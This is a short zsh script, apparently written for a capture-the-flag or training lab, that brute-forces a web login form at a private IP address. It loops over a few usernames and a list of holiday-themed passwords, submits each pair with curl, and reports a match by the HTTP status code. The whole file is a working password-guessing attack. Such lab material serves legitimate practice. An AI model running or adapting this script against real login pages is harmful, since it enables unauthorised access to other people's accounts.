#!/bin/zsh

function fuzz() {

    local UsernameList=(
            'cmnatic'
            'santa'
            'admin'
        )

    local PasswordList=(
            'admin'
            'password'
            'password123'
            'cmnatic'
            'cmnatic123'
            'christmas'
            'elves!'
            'santa'
            'festive'
            'joy123'
            'myrrh!'
            'yuletide'
            'presents'
            'candy'
            'tidings'
            'cookie'
            'cookies'
            'biscuits!'
            'snowball'
            'snowball123'
        )

    for user in "${UsernameList[@]}";
    do
        for password in "${PasswordList[@]}";
        do
            echo "login: $user"
            ( echo "$(curl -s -X POST -F 'username='$user -F 'password='$password -F 'submit=Login' $1 -o /dev/null -w "%{http_code}")" | grep 200 > /dev/null ) && echo "password $password is not valid" || ( echo "password $password IS VALIDO CARALHO" | lolcat )
            echo ''
        done
    done
}

fuzz 'http://10.10.35.103'

